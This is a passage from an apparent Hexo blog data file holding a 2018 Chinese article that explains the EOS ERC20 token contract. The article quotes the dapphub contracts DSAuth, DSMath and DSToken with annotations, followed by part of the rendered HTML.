wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * WAD + y / 2) / y);\n    }\n\n    function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmin(x, y);\n    }\n    function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmax(x, y);\n    }\n\n    /*\n    RAY math 同上，但是精度不同 为 10 ** 27\n     */\n\n    uint128 constant RAY = 10 ** 27;\n\n    function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hadd(x, y);\n    }\n\n    function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hsub(x, y);\n    }\n\n    function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * y + RAY / 2) / RAY);\n    }\n\n    function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * RAY + y / 2) / y);\n    }\n\n    // 指数运算\n    function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n        // This famous algorithm is called \"exponentiation by squaring\"\n        // and calculates x^n with x as fixed-point and n as regular unsigned.\n        //\n        // It's O(log n), instead of O(n) for naive repeated multiplication.\n        //\n        // These facts are why it works:\n        //\n        //  If n is even, then x^n = (x^2)^(n/2).\n        //  If n is odd,  then x^n = x * x^(n-1),\n        //   and applying the equation for even x gives\n        //    x^n = x * (x^2)^((n-1) / 2).\n        //\n        //  Also, EVM division is flooring and\n        //    floor[(n-1) / 2] = floor[n / 2].\n\n        z = n % 2 != 0 ? x : RAY;\n\n        for (n /= 2; n != 0; n /= 2) {\n            x = rmul(x, x);\n\n            if (n % 2 != 0) {\n                z = rmul(z, x);\n            }\n        }\n    }\n\n    function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmin(x, y);\n    }\n    function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmax(x, y);\n    }\n\n    // x 的 uint256 类型可以无损被转换成 uint128 类型\n    function cast(uint256 x) constant internal returns (uint128 z) {\n        assert((z = uint128(x)) == x);\n    }\n}\n```\n\n### 7. ERC20\n```\n// ERC20 抽象合约 接口\ncontract ERC20 {\n    // 代币总量\n    function totalSupply() constant returns (uint supply);\n    // 用户资产\n    function balanceOf(address who) constant returns (uint value);\n    // 第三方可提币额度\n    function allowance(address owner, address spender) constant returns (uint _allowance);\n\n    // 转账到指定账户\n    function transfer(address to, uint value) returns (bool ok);\n    // 从第三方账户转账\n    function transferFrom(address from, address to, uint value) returns (bool ok);\n    // 设置提币额度\n    function approve(address spender, uint value) returns (bool ok);\n\n    // 转账事件\n    event Transfer(address indexed from, address indexed to, uint value);\n    // 提币事件\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n```\n\n以太坊规定的一个代币接口。与普遍意义上的接口目的相同，对于某些功能的一些约定，满足接口来实现更方便的协同操作。如果代币都实现了接口，那么钱包就能使用同一套方式来操作这些代币等等。\n\n### 8. DSTokenBase\n```\n// 代币基础合约\ncontract DSTokenBase is ERC20, DSMath {\n    uint256                                            _supply; // 代币当前总量\n    mapping (address => uint256)                       _balances; // 余额数组\n    mapping (address => mapping (address => uint256))  _approvals; // 提币额度数组\n    \n    // 构造函数\n    function DSTokenBase(uint256 supply) {\n        _balances[msg.sender] = supply; // 设置发行代币者的初始余额\n        _supply = supply; // 设置当前代币总额\n    }\n    \n    // 返回当前代币总量\n    function totalSupply() constant returns (uint256) {\n        return _supply;\n    }\n\n    // 返回 src 用户的余额\n    function balanceOf(address src) constant returns (uint256) {\n        return _balances[src];\n    }\n\n    // 返回 guy 可以从 src 提取的币量\n    function allowance(address src, address guy) constant returns (uint256) {\n        return _approvals[src][guy];\n    }\n    \n    // 从自己的余额中转移 wad 个代币到 dst 余额中\n    function transfer(address dst, uint wad) returns (bool) {\n        // 自己的余额足够转账数量 否则 throw\n        assert(_balances[msg.sender] >= wad);\n        \n        // 通过 DSMath 来对余额进行增减\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\n        _balances[dst] = add(_balances[dst], wad);\n        \n        // 触发事件\n        Transfer(msg.sender, dst, wad);\n        \n        return true;\n    }\n    \n    // 从 src 转移 wad 个代币到 dst 余额\n    function transferFrom(address src, address dst, uint wad) returns (bool) {\n    \t// 转账金额不能超额\n        assert(_balances[src] >= wad);\n        assert(_approvals[src][msg.sender] >= wad);\n        \n        // 通过 DSMath 来处理余额\n        _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n        \n        // 触发事件\n        Transfer(src, dst, wad);\n        \n        return true;\n    }\n    \n    // 设置 guy 可以从自己的余额中提取 wad 个代币\n    function approve(address guy, uint256 wad) returns (bool) {\n        _approvals[msg.sender][guy] = wad;\n        \n        Approval(msg.sender, guy, wad);\n        \n        return true;\n    }\n}\n```\n\n继承 `DSMath` 和抽象合约 `ERC20`。实现 `ERC20` 的代币函数，使用 `DSMath` 来处理余额。\n\n### 9. DSToken\n```\n// 具体代币合约\n// `DSTokenBase(0)` 运行了 `DSTokenBase` 的构造函数，传入的参数值为 0。\ncontract DSToken is DSTokenBase(0), DSStop {\n    bytes32  public  symbol; // 代币符号 如 EOS\n    uint256  public  decimals = 18; // 标准的代币精度，可以被定制\n\n    // 构造函数 设置代币符号\n    function DSToken(bytes32 symbol_) {\n        symbol = symbol_;\n    }\n\n    function transfer(address dst, uint wad) stoppable note returns (bool) {\n        return super.transfer(dst, wad);\n    }\n\n    function transferFrom(\n        address src, address dst, uint wad\n    ) stoppable note returns (bool) {\n        return super.transferFrom(src, dst, wad);\n    }\n\n    function approve(address guy, uint wad) stoppable note returns (bool) {\n        return super.approve(guy, wad);\n    }\n\n    // 推送 本合约 `transfer()` 的别名\n    function push(address dst, uint128 wad) returns (bool) {\n        return transfer(dst, wad);\n    }\n\n    // 拉取 本合约 `transferFrom()` 的特例\n    function pull(address src, uint128 wad) returns (bool) {\n        return transferFrom(src, msg.sender, wad);\n    }\n\n    // 充值 增加代币\n    function mint(uint128 wad) auth stoppable note {\n        _balances[msg.sender] = add(_balances[msg.sender], wad);\n        _supply = add(_supply, wad);\n    }\n\n    // 燃烧 销毁代币\n    function burn(uint128 wad) auth stoppable note {\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\n        _supply = sub(_supply, wad);\n    }\n\n    // Optional token name\n\n    bytes32   public  name = \"\";\n    \n    function setName(bytes32 name_) auth {\n        name = name_;\n    }\n}\n```\n\n`transfer / transferFrom / approve / mint / burn` 等方法使用了 `stoppable / note` 修饰器，在执行这些函数前，需要判断众筹是否已经停止，如果未停止，触发记录事件。\n\n`mint / burn` 还在其他修饰器之前使用了 `auth` 修饰器，表示在使用这两个函数时，首要检查调用这些函数的用户是否合法。\n\n比起 `ERC20` 约定的基本函数，本合约额外增加了 `push / pull / mint / burn`。从具体代码来看，`push` 成了 `transfer` 的一个别名，而 `pull` 调用 `transferFrom` 时将 `dst` 固定为 `msg.sender`。从逻辑上来看，`push / pull` 是针对转账的额外处理，用于当前用户对自身余额的操作。`mint / burn` 则是对应于 `EOS` 的众筹方式。\n\n## 最后\n\n从区块浏览器内查询到的 EOS 合约如上。合约本身并不复杂，Solidity 的基本语法，和 ERC20 代币的逻辑。但是如 `DSToken` 合约中的 `mint / burn` 则与 EOS 的众筹方式相关：[GitHub 仓库](https://github.com/EOSIO/eos-token-distribution) - [区块浏览器合约地址](https://etherscan.io/address/0xd0a6e6c54dbc68db5db3a091b171a77407ff7ccf#code)。\n","source":"_posts/EOS-合约理解.md","raw":"---\ntitle: EOS-合约理解\ncomments: false\ndate: 2018-03-15 18:59:16\ncategories: 智能合约\ntags: \n- ZhouFyk\n- 以太坊 \n- EOS \n- 智能合约\nimg:\n---\n\n[合约链接](https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0#code)\n\n## 结构组成\n\n使用了 [dapphub 的库](https://github.com/dapphub)。\n\n```\nA:DSAuthority-----     DSAuthEvents\n                  |       |\nA:ERC20\t DSMath\t   ---> DSAuth      DSNote\n   |\t   |              |           |\n    -------                -----------\n        |                     |\n    DSTokenBase             DSStop\n        |                     |\n         ---------------------\n                   |\n                 DSToken\n\nA:abstract contract\n下面的合约继承上面的合约。DSAuthority 在 DSAuth 中被使用。\n```\n\n## 合约简介\n\n### 1. [DSNote](https://dapp.tools/dappsys/ds-note.html)\n\n记录合约。定义了事件 `LogNote`，声明为 `anonymous`。定义了修饰器 `note`，内部会触发事件 `LogNote`。\n\n### 2. [DSAuth](https://dapp.tools/dappsys/ds-auth.html)\n\n2.1 DSAuthority\n\n抽象函数，只有一个 `canCall` 函数。\n\n2.2 DSAuthEvents\n\n认证事件合约。只有两个事件 `LogSerAuthority / LogSetOwner`。当设置 `Authority / Owner` 时触发。\n\n2.3 DSAuth\n\n继承了 `DSAuthEvents`。设置 `Authority / Owner`，以及对来源的检测。\n\n### 3. [DSStop](https://dapp.tools/dappsys/ds-stop.html)\n\n继承 `DSAuth`，`DSNote`。设置 `stopped`，停止标识符。\n\n### 4. [DSMath](https://dapp.tools/dappsys/ds-math.html)\n\n安全的常规数学运算。包含了 `uint256 / uint128 / int256 / WAD / RAY` 等相关的运算。\n\n### 5. [ERC20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)\n\n以太坊上发行代币的接口。实现此接口，可以方便对代币进行操作。\n\n### 6. [DSToken](https://dapp.tools/dappsys/ds-token.html)\n\n6.1 DSTokenBase\n\n继承 `ERC20 / DSMath` 合约。实现了抽象函数中的方法，完成了代币的基础功能。\n\n6.2 DSToken\n\n具体代币的合约，实际的交互合约。\n\n* 以上与所链接的文档有些许差别。\n\n## 合约代码阅读\n\n### 1. DSNote\n```\n// 记录的合约\ncontract DSNote {\n    /*\n    记录 事件 声明了 anonymous，使用了 indexed\n    */ \n    event LogNote(\n        bytes4   indexed  sig,\n        address  indexed  guy,\n        bytes32  indexed  foo,\n        bytes32  indexed  bar,\n\tuint\t \t  wad,\n        bytes             fax\n    ) anonymous;\n\n    // 修饰器\n    modifier note {\n        bytes32 foo;\n        bytes32 bar;\n\n        // 内联汇编\n        assembly {\n            // := 赋值\n            // calldataload(p) : 从 p 位置开始调用数据 (32 bytes)\n            foo := calldataload(4)\n            bar := calldataload(36)\n        }\n\n        // 触发 记录事件\n        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n\n        _;\n    }\n}\n```\n\n根据[`event` 的文档描述](https://solidity.readthedocs.io/en/latest/contracts.html#events)：\n> Up to three parameters can receive the attribute `indexed` which will cause the respective arguments to be searched for: It is possible to filter for specific values of indexed arguments in the user interface.\n\n最多只能有三个参数可以接受 `indexed` 属性，不知道为什么此处有 4 个。`indexed` 指定的参数可以在用户界面中被搜索。\n\n`anonymous` 的声明，[`event` 的文档描述](https://solidity.readthedocs.io/en/latest/contracts.html#events)：\n> The hash of the signature of the event is one of the topics except if you declared the event with `anonymous` specifier. This means that it is not possible to filter for specific anonymous events by name.\n>\n> 除非你使用 `anonymous` 声明事件，否则事件签名的哈希值将成为 topic 之一。意思是无法通过名称筛选指定的 `anonymous` 事件。\n\n[`assembly` 的文档描述](https://solidity.readthedocs.io/en/latest/assembly.html#inline-assembly)：\n\n> 函数式赋值, 如 x := add(y, 3)\n\n[`opcodes` 的文档描述](https://solidity.readthedocs.io/en/latest/assembly.html#opcodes)：\n\n> calldataload(p) : 从 p 位置开始调用数据 (32 bytes)\n\n`foo, bar` 两个参数，一直是当前调用函数相关的值。\n\n### 2. DSAuthority\n```\ncontract DSAuthority {\n    // 函数未实现\n    function canCall(\n        address src, address dst, bytes4 sig\n    ) constant returns (bool);\n}\n```\n\n这是一个抽象合约，`canCall` 函数未实现。`constant` 表示函数不会对合约状态进行修改。\n\n### 3. DSAuthEvents\n\n```\ncontract DSAuthEvents {\n    // 记录验证 事件\n    event LogSetAuthority (address indexed authority);\n    // 记录主人 事件\n    event LogSetOwner     (address indexed owner);\n}\n```\n\n只包含了两个事件的声明。当用户设置 `authority / owner` 时会触发。\n\n### 4. DSAuth\n```\n// 认证合约\n// `is` 表示继承了 `DSAuthEvents`\ncontract DSAuth is DSAuthEvents {\n    DSAuthority  public  authority;\n    address      public  owner;\n  \n    // 修饰器\n    modifier auth {\n        // isAuthorized() 为 true\n        assert(isAuthorized(msg.sender, msg.sig));\n        _;\n    }\n\n    // 修饰器 未被使用到\n    modifier authorized(bytes4 sig) {\n    \t// isAuthorized() 为 true\n        assert(isAuthorized(msg.sender, sig));\n        _;\n    }\n  \n    // 构造函数，设置 owner\n    function DSAuth() {\n        owner = msg.sender;\n        LogSetOwner(msg.sender);\n    }\n\n    // 验证函数\n    function assert(bool x) internal {\n        if (!x) throw;\n    }\n\n    // 通过 auth 验证，设置 owner，触发事件\n    function setOwner(address owner_) auth\n    {\n        owner = owner_;\n        LogSetOwner(owner);\n    }\n\n    // 通过 auth 验证，设置 authority，触发事件\n    function setAuthority(DSAuthority authority_) auth\n    {\n        authority = authority_;\n        LogSetAuthority(authority);\n    }\n\n    // 认证函数 根据 src 和 authority 的情况来返回操作结果\n    function isAuthorized(address src, bytes4 sig) internal returns (bool) {\n        if (src == address(this)) { \n            return true;\n        } else if (src == owner) { \n            return true;\n        } else if (authority == DSAuthority(0)) { \n            return false;\n        } else {\n            return authority.canCall(src, this, sig);\n        }\n    }\n}\n```\n\n合约继承了认证事件。合约主要用来对认证部分进行处理。在设置 owner 和 authority 之前，触发 auth 修饰器，通过函数 `isAuthorized()` 来对消息发送者 `msg` 进行验证。消息发送者 `msg` 包含：\n\n4.1 `msg.data(bytes)`：完整的调用数据\n4.2 `msg.gas(uint)`：剩余燃气 - 在版本 0.4.21 中废弃并由 `gasleft()` 取代\n4.3 `msg.sender(address)`：当前消息的发送者\n4.4 `msg.sig(bytes4)`：调用数据的前四个字节（即函数的标识符）\n4.5 `msg.value(uint)`：伴随消息发送的 wei 的数值\n\n函数 `isAuthorized()` 是 `internal` 内部函数，只能在内部或者派生的合约中被调用，无需使用 `this`。首先将 `src` 与 `this` 的地址进行比较，如果为 `true` 则返回 `true`。[`this` 的定义](https://solidity.readthedocs.io/en/latest/units-and-global-variables.html#contract-related)是：\n\n> `this` (current contract’s type): the current contract, explicitly convertible to Address\n>\n> 当前合约的类型：当前的合约，显式转换为地址。\n\n然后比较 `src` 与 `owner`，如果为 `true` 返回 `true`。构造函数中 `owner` 就是部署合约的用户地址，因为构造函数只设置了 `owner`，所以默认只用操作 `owner`，到此就截止了。\n\n然后比较 `authority` 与 `DSAuthority(0)`。`DSAuthority(0)` 表示将 0 强制转换成 `DSAuthority` 类型，此时与 `authority` 进行比较，如果相等，则说明 `authority` 未被赋值。因为任何变量如果没有被赋值，那么它的初始值就是 0。所以相等，说明未被赋值过，返回 false。而如果比较结果为 false，则说明使用了 `authority` 变量，那么可以进行下一步了，即调用 `authority.canCall(src, this, sig)` 并返回其结果。此处 `canCall` 函数并没有被实现，但是提供了一个接口给用户，如果用户想要使用，只需要继承 `DSAuthority`，然后实现该函数，然后使用该继承的合约即可。\n\n### 5. DSStop\n```\n// 停止合约\ncontract DSStop is DSAuth, DSNote {\n    // 停止标识符\n    bool public stopped;\n\n    // 修饰器 检测停止标识符\n    modifier stoppable {\n        assert (!stopped);\n        _;\n    }\n\n    // 停止函数\n    function stop() auth note {\n        stopped = true;\n    }\n\n    // 启动函数\n    function start() auth note {\n        stopped = false;\n    }\n}\n```\n\n继承了 `DSAuth / DSNote` 合约。定义了 `stoppable` 检测众筹是否停止。定义了两个函数，分别用来设置停止标识符，表示启动或结束，设置的时候通过 `auth` 来进行权限验证，`note` 来触发变更。\n\n### 6. DSMath\n```\n// 安全的数学运算\ncontract DSMath {\n    \n    /*\n    标准 uint256 函数 256 位无符号数 即 非负整数 0 ~ 2^256 - 1\n\n    constant 表示不会改变状态变量\n    internal 表示只会被本合约和继承了的合约所使用\n     */\n\n    // 加法\n    function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x + y) >= x);\n    }\n\n    // 减法\n    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x - y) <= x);\n    }\n\n    // 乘法\n    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        assert((z = x * y) >= x);\n    }\n\n    // 除法 当除以 0 时，solidity 会自动抛出异常\n    function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        z = x / y;\n    }\n\n    // 返回较小值\n    function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    // 返回较大值\n    function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    /*\n    uint128 functions (h is for half) 由 256 位变为 128 位 其余同上\n     */\n\n    function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x + y) >= x);\n    }\n\n    function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x - y) <= x);\n    }\n\n    function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        assert((z = x * y) >= x);\n    }\n\n    function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = x / y;\n    }\n\n    function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        return x <= y ? x : y;\n    }\n    function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        return x >= y ? x : y;\n    }\n\n\n    /*\n    int256 functions 有符号 256 位函数\n     */\n\n    function imin(int256 x, int256 y) constant internal returns (int256 z) {\n        return x <= y ? x : y;\n    }\n    function imax(int256 x, int256 y) constant internal returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    /*\n    WAD math 提供 18 位精度，同上 乘法和除法加入 WAD\n     */\n\n    uint128 constant WAD = 10 ** 18;\n\n    function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hadd(x, y);\n    }\n\n    function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hsub(x, y);\n    }\n\n    function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * y + WAD / 2) / WAD);\n    }\n\n    function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * WAD + y / 2) / y);\n    }\n\n    function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmin(x, y);\n    }\n    function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmax(x, y);\n    }\n\n    /*\n    RAY math 同上，但是精度不同 为 10 ** 27\n     */\n\n    uint128 constant RAY = 10 ** 27;\n\n    function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hadd(x, y);\n    }\n\n    function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hsub(x, y);\n    }\n\n    function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * y + RAY / 2) / RAY);\n    }\n\n    function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n        z = cast((uint256(x) * RAY + y / 2) / y);\n    }\n\n    // 指数运算\n    function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n        // This famous algorithm is called \"exponentiation by squaring\"\n        // and calculates x^n with x as fixed-point and n as regular unsigned.\n        //\n        // It's O(log n), instead of O(n) for naive repeated multiplication.\n        //\n        // These facts are why it works:\n        //\n        //  If n is even, then x^n = (x^2)^(n/2).\n        //  If n is odd,  then x^n = x * x^(n-1),\n        //   and applying the equation for even x gives\n        //    x^n = x * (x^2)^((n-1) / 2).\n        //\n        //  Also, EVM division is flooring and\n        //    floor[(n-1) / 2] = floor[n / 2].\n\n        z = n % 2 != 0 ? x : RAY;\n\n        for (n /= 2; n != 0; n /= 2) {\n            x = rmul(x, x);\n\n            if (n % 2 != 0) {\n                z = rmul(z, x);\n            }\n        }\n    }\n\n    function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmin(x, y);\n    }\n    function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n        return hmax(x, y);\n    }\n\n    // x 的 uint256 类型可以无损被转换成 uint128 类型\n    function cast(uint256 x) constant internal returns (uint128 z) {\n        assert((z = uint128(x)) == x);\n    }\n}\n```\n\n### 7. ERC20\n```\n// ERC20 抽象合约 接口\ncontract ERC20 {\n    // 代币总量\n    function totalSupply() constant returns (uint supply);\n    // 用户资产\n    function balanceOf(address who) constant returns (uint value);\n    // 第三方可提币额度\n    function allowance(address owner, address spender) constant returns (uint _allowance);\n\n    // 转账到指定账户\n    function transfer(address to, uint value) returns (bool ok);\n    // 从第三方账户转账\n    function transferFrom(address from, address to, uint value) returns (bool ok);\n    // 设置提币额度\n    function approve(address spender, uint value) returns (bool ok);\n\n    // 转账事件\n    event Transfer(address indexed from, address indexed to, uint value);\n    // 提币事件\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n```\n\n以太坊规定的一个代币接口。与普遍意义上的接口目的相同，对于某些功能的一些约定，满足接口来实现更方便的协同操作。如果代币都实现了接口，那么钱包就能使用同一套方式来操作这些代币等等。\n\n### 8. DSTokenBase\n```\n// 代币基础合约\ncontract DSTokenBase is ERC20, DSMath {\n    uint256                                            _supply; // 代币当前总量\n    mapping (address => uint256)                       _balances; // 余额数组\n    mapping (address => mapping (address => uint256))  _approvals; // 提币额度数组\n    \n    // 构造函数\n    function DSTokenBase(uint256 supply) {\n        _balances[msg.sender] = supply; // 设置发行代币者的初始余额\n        _supply = supply; // 设置当前代币总额\n    }\n    \n    // 返回当前代币总量\n    function totalSupply() constant returns (uint256) {\n        return _supply;\n    }\n\n    // 返回 src 用户的余额\n    function balanceOf(address src) constant returns (uint256) {\n        return _balances[src];\n    }\n\n    // 返回 guy 可以从 src 提取的币量\n    function allowance(address src, address guy) constant returns (uint256) {\n        return _approvals[src][guy];\n    }\n    \n    // 从自己的余额中转移 wad 个代币到 dst 余额中\n    function transfer(address dst, uint wad) returns (bool) {\n        // 自己的余额足够转账数量 否则 throw\n        assert(_balances[msg.sender] >= wad);\n        \n        // 通过 DSMath 来对余额进行增减\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\n        _balances[dst] = add(_balances[dst], wad);\n        \n        // 触发事件\n        Transfer(msg.sender, dst, wad);\n        \n        return true;\n    }\n    \n    // 从 src 转移 wad 个代币到 dst 余额\n    function transferFrom(address src, address dst, uint wad) returns (bool) {\n    \t// 转账金额不能超额\n        assert(_balances[src] >= wad);\n        assert(_approvals[src][msg.sender] >= wad);\n        \n        // 通过 DSMath 来处理余额\n        _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n        _balances[src] = sub(_balances[src], wad);\n        _balances[dst] = add(_balances[dst], wad);\n        \n        // 触发事件\n        Transfer(src, dst, wad);\n        \n        return true;\n    }\n    \n    // 设置 guy 可以从自己的余额中提取 wad 个代币\n    function approve(address guy, uint256 wad) returns (bool) {\n        _approvals[msg.sender][guy] = wad;\n        \n        Approval(msg.sender, guy, wad);\n        \n        return true;\n    }\n}\n```\n\n继承 `DSMath` 和抽象合约 `ERC20`。实现 `ERC20` 的代币函数，使用 `DSMath` 来处理余额。\n\n### 9. DSToken\n```\n// 具体代币合约\n// `DSTokenBase(0)` 运行了 `DSTokenBase` 的构造函数，传入的参数值为 0。\ncontract DSToken is DSTokenBase(0), DSStop {\n    bytes32  public  symbol; // 代币符号 如 EOS\n    uint256  public  decimals = 18; // 标准的代币精度，可以被定制\n\n    // 构造函数 设置代币符号\n    function DSToken(bytes32 symbol_) {\n        symbol = symbol_;\n    }\n\n    function transfer(address dst, uint wad) stoppable note returns (bool) {\n        return super.transfer(dst, wad);\n    }\n\n    function transferFrom(\n        address src, address dst, uint wad\n    ) stoppable note returns (bool) {\n        return super.transferFrom(src, dst, wad);\n    }\n\n    function approve(address guy, uint wad) stoppable note returns (bool) {\n        return super.approve(guy, wad);\n    }\n\n    // 推送 本合约 `transfer()` 的别名\n    function push(address dst, uint128 wad) returns (bool) {\n        return transfer(dst, wad);\n    }\n\n    // 拉取 本合约 `transferFrom()` 的特例\n    function pull(address src, uint128 wad) returns (bool) {\n        return transferFrom(src, msg.sender, wad);\n    }\n\n    // 充值 增加代币\n    function mint(uint128 wad) auth stoppable note {\n        _balances[msg.sender] = add(_balances[msg.sender], wad);\n        _supply = add(_supply, wad);\n    }\n\n    // 燃烧 销毁代币\n    function burn(uint128 wad) auth stoppable note {\n        _balances[msg.sender] = sub(_balances[msg.sender], wad);\n        _supply = sub(_supply, wad);\n    }\n\n    // Optional token name\n\n    bytes32   public  name = \"\";\n    \n    function setName(bytes32 name_) auth {\n        name = name_;\n    }\n}\n```\n\n`transfer / transferFrom / approve / mint / burn` 等方法使用了 `stoppable / note` 修饰器，在执行这些函数前，需要判断众筹是否已经停止，如果未停止，触发记录事件。\n\n`mint / burn` 还在其他修饰器之前使用了 `auth` 修饰器，表示在使用这两个函数时，首要检查调用这些函数的用户是否合法。\n\n比起 `ERC20` 约定的基本函数，本合约额外增加了 `push / pull / mint / burn`。从具体代码来看，`push` 成了 `transfer` 的一个别名，而 `pull` 调用 `transferFrom` 时将 `dst` 固定为 `msg.sender`。从逻辑上来看，`push / pull` 是针对转账的额外处理，用于当前用户对自身余额的操作。`mint / burn` 则是对应于 `EOS` 的众筹方式。\n\n## 最后\n\n从区块浏览器内查询到的 EOS 合约如上。合约本身并不复杂，Solidity 的基本语法，和 ERC20 代币的逻辑。但是如 `DSToken` 合约中的 `mint / burn` 则与 EOS 的众筹方式相关：[GitHub 仓库](https://github.com/EOSIO/eos-token-distribution) - [区块浏览器合约地址](https://etherscan.io/address/0xd0a6e6c54dbc68db5db3a091b171a77407ff7ccf#code)。\n","slug":"EOS-合约理解","published":1,"updated":"2018-03-16T07:50:59.579Z","layout":"post","photos":[],"link":"","_id":"cjf7piaus0001pkwoe1b16kmt","content":"<p><a href=\"https://etherscan.io/address/0x86fa049857e0209aa7d9e616f7eb3b3b78ecfdb0#code\" target=\"_blank\" rel=\"noopener\">合约链接</a></p>\n<h2 id=\"结构组成\"><a href=\"#结构组成\" class=\"headerlink\" title=\"结构组成\"></a>结构组成</h2><p>使用了 <a href=\"https://github.com/dapphub\" target=\"_blank\" rel=\"noopener\">dapphub 的库</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A:DSAuthority-----     DSAuthEvents</span><br><span class=\"line\">                  |       |</span><br><span class=\"line\">A:ERC20\t DSMath\t   ---&gt; DSAuth      DSNote</span><br><span class=\"line\">   |\t   |              |           |</span><br><span class=\"line\">    -------                -----------</span><br><span class=\"line\">        |                     |</span><br><span class=\"line\">    DSTokenBase             DSStop</span><br><span class=\"line\">        |                     |</span><br><span class=\"line\">         ---------------------</span><br><span class=\"line\">                   |</span><br><span class=\"line\">                 DSToken</span><br><span class=\"line\"></span><br><span class=\"line\">A:abstract contract</span><br><span class=\"line\">下面的合约继承上面的合约。DSAuthority 在 DSAuth 中被使用。</span><br></pre></td></tr></table></figure>\n<h2 id=\"合约简介\"><a href=\"#合约简介\" class=\"headerlink\" title=\"合约简介\"></a>合约简介</h2><h3 id=\"1-DSNote\"><a href=\"#1-DSNote\" class=\"headerlink\" title=\"1. DSNote\"></a>1. <a href=\"https://dapp.tools/dappsys/ds-note.html\" target=\"_blank\" rel=\"noopener\">DSNote</a></h3><p>记录合约。定义了事件 <code>LogNote</code>，声明为 <code>anonymous</code>。定义了修饰器 <code>note</code>，内部会触发事件 <code>LogNote</code>。</p>\n<h3 id=\"2-DSAuth\"><a href=\"#2-DSAuth\" class=\"headerlink\" title=\"2. DSAuth\"></a>2. <a href=\"https://dapp.tools/dappsys/ds-auth.html\" target=\"_blank\" rel=\"noopener\">DSAuth</a></h3><p>2.1 DSAuthority</p>\n<p>抽象函数，只有一个 <code>canCall</code> 函数。</p>\n<p>2.2 DSAuthEvents</p>\n<p>认证事件合约。只有两个事件 <code>LogSerAuthority / LogSetOwner</code>。当设置 <code>Authority / Owner</code> 时触发。</p>\n<p>2.3 DSAuth</p>\n<p>继承了 <code>DSAuthEvents</code>。设置 <code>Authority / Owner</code>，以及对来源的检测。</p>\n<h3 id=\"3-DSStop\"><a href=\"#3-DSStop\" class=\"headerlink\" title=\"3. DSStop\"></a>3. <a href=\"https://dapp.tools/dappsys/ds-stop.html\" target=\"_blank\" rel=\"noopener\">DSStop</a></h3><p>继承 <code>DSAuth</code>，<code>DSNote</code>。设置 <code>stopped</code>，停止标识符。</p>\n<h3 id=\"4-DSMath\"><a href=\"#4-DSMath\" class=\"headerlink\" title=\"4. DSMath\"></a>4. <a href=\"https://dapp.tools/dappsys/ds-math.html\" target=\"_blank\" rel=\"noopener\">DSMath</a></h3><p>安全的常规数学运算。包含了 <code>uint256 / uint128 / int256 / WAD / RAY</code> 等相关的运算。</p>\n<h3 id=\"5-ERC20\"><a href=\"#5-ERC20\" class=\"headerlink\" title=\"5. ERC20\"></a>5. <a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\" target=\"_blank\" rel=\"noopener\">ERC20</a></h3><p>以太坊上发行代币的接口。实现此接口，可以方便对代币进行操作。</p>\n<h3 id=\"6-DSToken\"><a href=\"#6-DSToken\" class=\"headerlink\" title=\"6. DSToken\"></a>6. <a href=\"https://dapp.tools/dappsys/ds-token.html\" 